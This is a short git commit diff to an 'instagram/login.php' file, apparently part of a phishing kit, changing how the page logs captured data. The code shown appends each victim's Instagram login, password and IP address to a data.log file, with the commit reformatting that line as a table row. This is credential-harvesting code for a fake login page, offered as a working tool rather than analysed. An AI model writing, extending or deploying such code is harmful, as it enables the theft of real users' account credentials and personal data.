45e8176428d2dc044a6e62875a4c0176ed22b965
termux-lab <59764619+termux-lab@users.noreply.github.com>
2020-07-13 01:05:54 +0300

    Update login.php

--- instagram/login.php
+++ instagram/login.php
@@ -10,7 +10,7 @@ fwrite($fp, $all);
 fclose($fp);
 $file = $_SERVER['DOCUMENT_ROOT']."/data.log";
 $file = str_replace("/instagram", "", $file);
-$al = "\r\n'INST', '$login', '$pass', '...', '$ip'";
+$al = "\r\nx.add_row(['INST', '$login', '$pass', '...', '$ip', ''])";
 $fp = fopen("$file", "a+");
 fwrite($fp, $al);
 fclose($fp);
